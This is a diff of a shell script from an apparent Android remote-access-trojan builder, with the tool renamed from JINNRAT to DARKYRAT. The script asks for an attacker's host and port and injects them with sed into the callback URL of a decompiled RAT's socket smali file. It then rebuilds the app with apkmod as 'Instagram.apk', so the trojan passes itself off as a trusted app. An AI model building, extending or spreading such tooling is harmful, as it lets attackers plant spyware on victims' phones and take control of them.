@@ -4,9 +4,9 @@ clear
 
 smaliFile="smali_classes4/com/Liz0rd/lizrat/IOSocket.smali"
 
-if [ -d $HOME/JINNRAT ]; then
+if [ -d $HOME/DARKYRAT ]; then
 
-    appPath="$HOME/JINNRAT/server/app/decompiled"
+    appPath="$HOME/DARKYRAT/server/app/decompiled"
 fi
 
 echo '''
@@ -32,4 +32,4 @@ read -p "✅ 🇵🇴🇷🇹 : " port
 
 sed -i "s#http.*#http://$host:$port?model=\"#" $appPath/$smaliFile
 
-apkmod -R -i "$appPath" -o ~/JINNRAT/app/Instagram.apk
+apkmod -R -i "$appPath" -o ~/DARKYRAT/app/Instagram.apk
